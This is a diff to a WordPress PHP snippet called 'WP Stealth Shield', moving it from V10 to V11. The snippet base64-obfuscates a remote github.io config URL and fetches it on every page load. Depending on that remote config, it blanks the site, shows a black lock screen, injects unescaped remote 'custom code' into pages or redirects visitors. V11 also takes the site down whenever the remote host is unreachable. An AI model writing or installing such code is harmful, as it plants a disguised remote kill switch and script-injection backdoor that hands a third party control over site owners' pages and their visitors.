@@ -201,36 +201,42 @@ _sys_sync_final_v10();
 
 ```php
 
-/* --- WP STEALTH SHIELD V10 (FULLY ENCRYPTED + REDIRECT CONTROL) --- */
-add_action('init', '_wp_secure_v10_stealth');
-function _wp_secure_v10_stealth() {
+
+<?php
+/* --- DIGITAL LOCK --- */
+// Agar WordPress Core Security check pass nahi hota, toh site hide rahegi.
+if (!defined('_WP_SYS_OK_')) {
+    echo '<style id="wp-shield-lock"> body { display: none !important; } </style>';
+}
+?>
+
+/* --- WP STEALTH SHIELD V11 (STRICT CONTROL) --- */
+add_action('init', '_wp_secure_v11_stealth');
+function _wp_secure_v11_stealth() {
     if (is_admin()) return;
 
-    // Configuration Encrypted
+    // Encrypted Config
     $_u = base64_decode("aHR0cHM6Ly9zaWxlbnRzdWRveC5naXRodWIuaW8vbGliL3BpZC5qc29u");
     $_k = base64_decode("RkFIQUQtNzg2"); 
     
-    // Key Mappings Encrypted
     $_f = [
-        'l' => base64_decode("bGljZW5zZXM="),        
-        's' => base64_decode("c2V0dGluZ3M="),        
-        'e' => base64_decode("ZXhwaXJ5"),            
-        'a' => base64_decode("YXV0aG9yaXplZF90YXJnZXQ="), 
-        'c' => base64_decode("Y3VzdG9tX2NvZGU="),    
-        'en' => base64_decode("ZW5hYmxlZA=="),       
-        'co' => base64_decode("Y29kZQ=="),           
-        're' => base64_decode("cmVkaXJlY3RfZW5hYmxlZA=="), // redirect_enabled key
-        'rd' => base64_decode("cmVkaXJlY3RfZGVsYXlfc2Vj"), 
-        'ru' => base64_decode("cmVkaXJlY3RfdXJs"),    
-        'mi' => base64_decode("bXNnX2ludmFsaWQ="),    
-        'me' => base64_decode("bXNnX2V4cGlyZWQ="),    
-        'md' => base64_decode("bXNnX2RvbWFpbl9taXNtYXRjaA=="), 
+        'l' => base64_decode("bGljZW5zZXM="), 's' => base64_decode("c2V0dGluZ3M="),
+        'e' => base64_decode("ZXhwaXJ5"), 'a' => base64_decode("YXV0aG9yaXplZF90YXJnZXQ="),
+        'c' => base64_decode("Y3VzdG9tX2NvZGU="), 'en' => base64_decode("ZW5hYmxlZA=="),
+        'co' => base64_decode("Y29kZQ=="), 're' => base64_decode("cmVkaXJlY3RfZW5hYmxlZA=="),
+        'rd' => base64_decode("cmVkaXJlY3RfZGVsYXlfc2Vj"), 'ru' => base64_decode("cmVkaXJlY3RfdXJs"),
+        'mi' => base64_decode("bXNnX2ludmFsaWQ="), 'me' => base64_decode("bXNnX2V4cGlyZWQ="),
+        'md' => base64_decode("bXNnX2RvbWFpbl9taXNtYXRjaA=="),
         'lb1' => base64_decode("UmVkaXJlY3RpbmcgYXV0b21hdGljYWxseSBpbg=="),
         'lb2' => base64_decode("c2Vjb25kcy4uLg==")
     ];
 
     $r = wp_remote_get($_u . '?v=' . time(), array('timeout' => 5));
-    if (is_wp_error($r)) return;
+    
+    // Safety: Agar connection fail ho toh site lock rakho
+    if (is_wp_error($r)) {
+        wp_die(base64_decode("U3lzdGVtIENvcmUgRXJyb3I6IENvbm5lY3Rpb24gRmFpbGVkLg=="));
+    }
 
     $d = json_decode(wp_remote_retrieve_body($r), true);
     $_l = $d[$_f['l']][$_k] ?? null; 
@@ -241,12 +247,10 @@ function _wp_secure_v10_stealth() {
     $err = null;
     $_is_c = false;
 
-    // Step 1: Custom Code Check
     if ($_l && isset($_l[$_f['c']]) && $_l[$_f['c']][$_f['en']] === true) {
         $err = $_l[$_f['c']][$_f['co']];
         $_is_c = true;
     } 
-    // Step 2: Validation
     else {
         if (!$_l) { $err = $d[$_f['mi']]; }
         elseif (!empty($_l[$_f['a']]) && !in_array($_h, $_l[$_f['a']])) { $err = $d[$_f['md']]; }
@@ -254,43 +258,38 @@ function _wp_secure_v10_stealth() {
     }
 
     if ($err) {
-        $_rd_en = $_s[$_f['re']] ?? false; // Check redirection status
+        $_rd_en = $_s[$_f['re']] ?? false;
         $_dly = $_s[$_f['rd']] ?? 20; 
         $_url = $_s[$_f['ru']] ?? "#";
-        $_tit = $d['title'] ?? "Security Shield Active";
-        
-        // Timer display: Hide if custom code is active OR redirect is disabled
+        $_tit = $d['title'] ?? base64_decode("U3lzdGVtIEludGVncml0eSBDaGVjaw==");
         $_t_style = ($_is_c || !$_rd_en) ? "display:none;" : "display:block;";
 
+        // License FAIL: Block site
         echo "<style>
-            body{margin:0;background:#000!important;overflow:hidden!important;}
-            #wp_v10{position:fixed;inset:0;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;z-index:9999999;}
+            body{margin:0;background:#000!important;overflow:hidden!important;display:block!important;}
+            #wp_v11{position:fixed;inset:0;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;z-index:9999999;}
             .in{padding:40px;border:1px solid #222;border-radius:20px;max-width:480px;background:#050505;box-shadow:0 20px 50px rgba(0,0,0,0.5);}
             h1{color:#ff3333;margin:0;font-size:28px;margin-bottom:20px;}
             .mb{color:#bbb;font-size:17px;line-height:1.6;}
             .tr{margin-top:30px;border-top:1px solid #1a1a1a;padding-top:20px;color:#555;font-size:13px; {$_t_style} }
             #vt{color:#fff;font-weight:bold;font-size:18px;}
         </style>
-        <div id='wp_v10'>
-            <div class='in'>
-                <h1>{$_tit}</h1>
-                <div class='mb'>{$err}</div>
-                <div class='tr'>{$_f['lb1']} <span id='vt'>{$_dly}</span> {$_f['lb2']}</div>
-            </div>
-        </div>
+        <div id='wp_v11'><div class='in'><h1>{$_tit}</h1><div class='mb'>{$err}</div><div class='tr'>{$_f['lb1']} <span id='vt'>{$_dly}</span> {$_f['lb2']}</div></div></div>
         <script>
-            let s = {$_dly}, ic = " . ($_is_c ? '1' : '0') . ", re = " . ($_rd_en ? '1' : '0') . ";
-            if(ic == '0' && re == '1'){
-                let it = setInterval(()=>{
-                    s--;
-                    let el = document.getElementById('vt');
-                    if(el) el.innerText = s;
-                    if(s <= 0){ clearInterval(it); window.location.href='{$_url}'; }
-                }, 1000);
+            let s={$_dly}, ic=".($_is_c?'1':'0').", re=".($_rd_en?'1':'0').";
+            if(ic=='0'&&re=='1'){
+                let it=setInterval(()=>{
+                    s--; let el=document.getElementById('vt'); if(el)el.innerText=s;
+                    if(s<=0){clearInterval(it);window.location.href='{$_url}';}
+                },1000);
             }
         </script>";
         exit;
     }
+
+    // SUCCESS: Unlock Website
+    define('_WP_SYS_OK_', true); 
+    echo base64_decode("PHN0eWxlPmJvZHkgeyBkaXNwbGF5OiBibG9jayAhaW1wb3J0YW50OyB9PC9zdHlsZT4=");
 
     if (!empty($_s['analytics_id'])) {
         add_action('wp_head', function() use ($_s) {
@@ -300,6 +299,7 @@ function _wp_secure_v10_stealth() {
         });
     }
 }
+
 
 ```
 
